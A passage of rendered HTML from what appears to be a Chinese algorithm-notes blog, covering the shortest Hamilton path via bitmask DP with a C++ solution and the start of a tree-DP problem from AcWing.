style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的最短 Hamilton 路径。</p><p>Hamilton 路径的定义是从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 不重不漏地经过每个点恰好一次。</p><p><strong>输入格式</strong></p><p>第一行输入整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，其中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个整数表示点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 的距离（记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[i,j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>）。</p><p>对于任意的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x,y,z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>，数据保证 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0</mn><mtext>，</mtext><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mo stretchy="false">[</mo><mi>y</mi><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[x,x]=0，a[x,y]=a[y,x]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mclose">]</span></span></span></span> 并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">]</mo><mo>+</mo><mi>a</mi><mo stretchy="false">[</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">]</mo><mo>≥</mo><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[x,y]+a[y,z] \ge a[x,z]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">]</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最短 Hamilton 路径的长度。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup></mrow><annotation encoding="application/x-tex">0 \le a[i,j] \le 10^7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>50 2 4 5 12 0 6 5 34 6 0 8 35 5 8 0 51 3 3 5 0</code></pre><p><strong>输出样例：</strong></p><pre><code>18</code></pre><h3 id="状态压缩dp">状态压缩dp</h3><ul><li>状态表示 <code>f[i][j]</code><ul><li>集合 所有从0走到j,走过的点集是i的所有路径</li><li>属性 Min</li></ul></li><li>状态计算 <code>f[i][j] = min(f[i][j], f[i - (1 &lt;&lt; j)][k] + w[k][j])</code><ul><li>按照倒数第2步走那个点进行分类</li><li>走k <code>f[i - (1 &lt;&lt; j)][k]</code><br>从到j的集合点的集合<code>i</code>，除去j本身得到<code>i - (1 &lt;&lt; j)</code></li></ul></li></ul><p>初始化 <code>f[1][0] = 0;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">20</span>, kM = <span class="number">1</span> &lt;&lt; kN;  <span class="comment">// kN不能开大了, 22就报MLE</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> w[kN][kN], f[kM][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 一定要初始化</span></span><br><span class="line">  <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> f);</span><br><span class="line">  f[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &gt;&gt; j &amp; <span class="number">1</span>) &#123;  <span class="comment">// 经过j的状态才有意义</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;  <span class="comment">// k不一定小于j</span></span><br><span class="line">          <span class="keyword">if</span> ((i - (<span class="number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - (<span class="number">1</span> &lt;&lt; j)][k] + w[k][j]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][n - <span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="树形DP">树形DP</h1><h2 id="AcWing-285-没有上司的舞会"><a href="https://www.acwing.com/problem/content/287/">AcWing 285. 没有上司的舞会</a></h2><p><code>难度：简单</code></p><p>Ural 大学有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 名职员，编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1 \sim N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p>他们的关系就像一棵以校长为根的树，父节点就是子节点的直接上司。</p><p>每个职员有一个快乐指数，用整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">H\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span> 给出，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1 \le i \le N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p>现在要召开一场周年庆宴会，不过，没有职员愿意和直接上司一起参会。</p><p>在满足这个条件的前提下，主办方希望邀请一部分职员参会，使得所有参会职员的快乐指数总和最大，求这个最大值。</p><p><strong>输入格式</strong></p><p>第一行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 号职员的快乐指数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">H\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">N-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 行，每行输入一对整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo separator="true">,</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">L, K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>，表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 的直接上司。</p><p><strong>输出格式</strong></p><p>输出最大的快乐指数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>6000</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 6000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>128</mn><mo>≤</mo><mi>H</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo>≤</mo><mn>127</mn></mrow><annotation encoding="application/x-tex">-128 \le H\_i \le 127</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">128</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">127</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>711111111 32 36 47 44 53 5</code></pre><p><strong>输出样例：</strong></p><pre><code>5</code></pre><h3 id="树形dp">树形dp</h3><ul><li>状态表示 <code>f[u][0 / 1]</code><ul><li>集合 从所有以u为根节点的子树中选，且不选(0) / 选择(1) u的方案</li><li>属性 Max</li></ul></li><li>状态计算<ul><li>不选u其子树根选不选都可以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mo>∑</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">[</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">[</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[u][0] = \sum max(f[s_i][0], f[s_i][1])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">])</span></span></span></span></li><li>选了u其子树根一定不能选 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mi>w</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo>+</mo><mo>∑</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">[</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[u][1] = w[u] + \sum max(f[s_i][0])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord"><span class="mord 